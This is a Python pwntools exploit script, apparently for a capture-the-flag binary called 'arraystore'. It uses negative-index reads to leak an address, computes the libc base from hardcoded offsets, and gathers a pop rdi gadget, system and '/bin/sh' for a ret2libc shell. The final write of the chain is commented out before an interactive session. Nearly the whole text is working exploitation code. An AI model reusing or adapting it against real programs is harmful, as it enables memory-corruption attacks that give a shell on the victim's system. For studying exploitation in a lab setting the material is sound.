from pwn import *

elf = context.binary = ELF("./arraystore")
libc = elf.libc
r = elf.process()

gdb.attach(r, '''b*main+153\nb*main+352\nb*main+442\nb*main+376\nc''')

def read(idx):
    r.sendlineafter(b"Read/Write?:", b"R")
    r.sendlineafter(b"Index:", b"-" + str(idx).encode())

def write(idx, data):
    r.sendlineafter(b"Read/Write?:", b"W")
    r.sendlineafter(b"Index:", b"-" + str(idx).encode())
    r.sendlineafter(b"Value:", str(data))

########################
#    LEAK LIBC ADDR    #
########################

read(0x7fffffffffffffff)
r.recvuntil(b"Value: ")
leak = int(r.recvline(), 10)
ret_addr = leak - 2370752
log.success(f"fgets_addr: {hex(ret_addr)}")
libc.address = leak - 0x207d98 - 412856
log.success(f"LIBC_ADDR: {hex(libc.address)}")

#################
#   ROP Chain   #
#################
pop_rdi = libc.address + 0x2a3e5
ret = pop_rdi + 1
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))

##################
#    EXPLOIT     #
##################
# write(ret_addr, pop_rdi)
r.interactive()